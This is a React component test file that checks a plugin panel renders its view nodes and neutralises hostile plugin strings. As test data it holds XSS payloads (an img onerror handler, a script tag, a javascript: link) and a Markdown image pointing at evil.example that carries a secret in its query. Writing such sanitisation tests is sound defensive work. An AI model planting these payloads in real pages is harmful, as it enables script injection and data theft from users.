import { describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";

vi.mock("mermaid", () => ({ default: { initialize: vi.fn(), render: vi.fn(async () => ({ svg: "<svg></svg>" })) } }));

import { PluginPanel } from "./PluginPanel";
import { sanitizeViewTree } from "../../lib/plugins/viewTree";

const INJECTION = `<img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>`;

describe("PluginPanel", () => {
  it("renders every node type with UI primitives", () => {
    const onAction = vi.fn();
    render(
      <PluginPanel
        label="Test panel"
        onAction={onAction}
        nodes={sanitizeViewTree([
          { type: "heading", text: "Word count", level: 2 },
          { type: "badge", text: "120 words", variant: "accent" },
          { type: "badge", text: "1 min read" },
          { type: "list", items: [{ text: "Intro", meta: "40 words" }, "Plain item"] },
          { type: "divider" },
          { type: "text", text: "Muted note", tone: "muted" },
          { type: "button", label: "Refresh", actionId: "refresh" },
        ])}
      />
    );
    const region = screen.getByRole("region", { name: "Test panel" });
    expect(region).toBeInTheDocument();
    expect(screen.getByRole("heading", { name: "Word count" }).tagName).toBe("H4");
    expect(screen.getByText("120 words")).toBeInTheDocument();
    expect(screen.getByText("40 words")).toBeInTheDocument();
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(screen.getByRole("separator")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Refresh" }));
    expect(onAction).toHaveBeenCalledWith("refresh");
  });

  it("never turns plugin strings into HTML", () => {
    const { container } = render(
      <PluginPanel
        label="Evil"
        onAction={() => undefined}
        nodes={sanitizeViewTree([
          { type: "heading", text: INJECTION },
          { type: "text", text: INJECTION },
          { type: "badge", text: INJECTION },
          { type: "list", items: [INJECTION, { text: INJECTION, meta: "<b>1</b>" }] },
          { type: "button", label: INJECTION, actionId: "x" },
        ])}
      />
    );
    expect(container.querySelector("img, script, b")).toBeNull();
    expect(screen.getAllByText(INJECTION, { exact: false }).length).toBeGreaterThanOrEqual(5);
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("renders Markdown without raw HTML, images or script URLs", () => {
    const { container } = render(
      <PluginPanel
        label="Markdown"
        onAction={() => undefined}
        nodes={sanitizeViewTree([
          {
            type: "markdown",
            content: [
              "**Bold** text",
              INJECTION,
              "![tracker](https://evil.example/pixel.png?d=secret)",
              "[click](javascript:alert(1))",
              "[docs](https://tauri.app)",
            ].join("\n\n"),
          },
        ])}
      />
    );
    expect(container.querySelector("strong")?.textContent).toBe("Bold");
    expect(container.querySelector("img, script, iframe")).toBeNull();
    expect(container.textContent).toContain("tracker");
    const links = [...container.querySelectorAll("a")];
    // The javascript: link is dropped to text; the web link opens in the system browser.
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://tauri.app/"]);
    expect(screen.getByText("click").closest("a")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });
});
